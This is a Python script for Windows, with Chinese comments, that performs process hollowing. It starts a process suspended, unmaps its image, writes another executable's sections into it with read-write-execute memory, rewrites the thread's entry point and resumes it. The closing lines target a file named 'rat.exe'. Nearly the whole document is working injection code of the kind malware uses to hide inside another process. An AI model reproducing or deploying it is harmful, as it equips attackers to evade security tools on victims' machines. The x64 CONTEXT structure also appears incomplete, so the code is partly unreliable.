import ctypes
from ctypes import wintypes

import pefile

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

CREATE_SUSPENDED = 0x00000004
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

DWORD64 = ctypes.c_ulonglong


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("P1Home", DWORD64),
        ("P2Home", DWORD64),
        ("P3Home", DWORD64),
        ("P4Home", DWORD64),
        ("P5Home", DWORD64),
        ("P6Home", DWORD64),
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        ("SegCs", wintypes.WORD),
        ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD),
        ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        ("Dr0", DWORD64),
        ("Dr1", DWORD64),
        ("Dr2", DWORD64),
        ("Dr3", DWORD64),
        ("Dr6", DWORD64),
        ("Dr7", DWORD64),
        ("Rax", DWORD64),
        ("Rcx", DWORD64),
        ("Rdx", DWORD64),
        ("Rbx", DWORD64),
        ("Rsp", DWORD64),
        ("Rbp", DWORD64),
        ("Rsi", DWORD64),
        ("Rdi", DWORD64),
        ("R8", DWORD64),
        ("R9", DWORD64),
        ("R10", DWORD64),
        ("R11", DWORD64),
        ("R12", DWORD64),
        ("R13", DWORD64),
        ("R14", DWORD64),
        ("R15", DWORD64),
        ("Rip", DWORD64),
    ]


def hollow_process(src, dst):
    startup_info = STARTUPINFO()
    startup_info.cb = ctypes.sizeof(startup_info)

    process_info = PROCESS_INFORMATION()

    # ✅ 使用 CreateProcessW
    success = kernel32.CreateProcessW(
        None,
        ctypes.c_wchar_p(dst),
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(startup_info),
        ctypes.byref(process_info)
    )

    if not success:
        return f"[-] CreateProcessW failed: {ctypes.GetLastError()}"

    context = CONTEXT()
    context.ContextFlags = 0x10007

    if not kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)):
        return f"[-] GetThreadContext failed: {ctypes.GetLastError()}"

    base = ctypes.c_void_p()

    if not kernel32.ReadProcessMemory(
            process_info.hProcess,
            ctypes.c_void_p(context.Rdx + 16),
            ctypes.byref(base),
            ctypes.sizeof(base),
            None
    ):
        return f"[-] ReadProcessMemory failed: {ctypes.GetLastError()}"

    src_pe = pefile.PE(src)

    # 如果基址冲突 → 卸载
    if base.value == src_pe.OPTIONAL_HEADER.ImageBase:
        ntdll.NtUnmapViewOfSection(process_info.hProcess, base)

    kernel32.VirtualAllocEx.restype = ctypes.c_void_p

    address = kernel32.VirtualAllocEx(
        process_info.hProcess,
        ctypes.c_void_p(src_pe.OPTIONAL_HEADER.ImageBase),
        src_pe.OPTIONAL_HEADER.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    if not address:
        return f"[-] VirtualAllocEx failed: {ctypes.GetLastError()}"

    with open(src, "rb") as f:
        data = f.read()

    # 写 headers
    if not kernel32.WriteProcessMemory(
            process_info.hProcess,
            ctypes.c_void_p(address),
            data,
            src_pe.OPTIONAL_HEADER.SizeOfHeaders,
            None
    ):
        return f"[-] Write headers failed"

    # 写 sections
    for section in src_pe.sections:
        if not kernel32.WriteProcessMemory(
                process_info.hProcess,
                ctypes.c_void_p(address + section.VirtualAddress),
                data[section.PointerToRawData: section.PointerToRawData + section.SizeOfRawData],
                section.SizeOfRawData,
                None
        ):
            return f"[-] Write section failed"

    # 修改入口点
    context.Rcx = address + src_pe.OPTIONAL_HEADER.AddressOfEntryPoint

    # 写 ImageBase
    image_base_offset = src_pe.OPTIONAL_HEADER.get_field_absolute_offset("ImageBase")

    if not kernel32.WriteProcessMemory(
            process_info.hProcess,
            ctypes.c_void_p(context.Rdx + 16),
            data[image_base_offset: image_base_offset + ctypes.sizeof(ctypes.c_void_p)],
            ctypes.sizeof(ctypes.c_void_p),
            None
    ):
        return f"[-] Write ImageBase failed"

    if not kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)):
        return f"[-] SetThreadContext failed"

    kernel32.ResumeThread(process_info.hThread)

    return "[+] Success"


src = r'C:\Program Files\Sublime Text 3\sublime_text.exe'
dst = r'C:\Users\方良辰\Desktop\rat.exe'
hollow_process(src, dst)
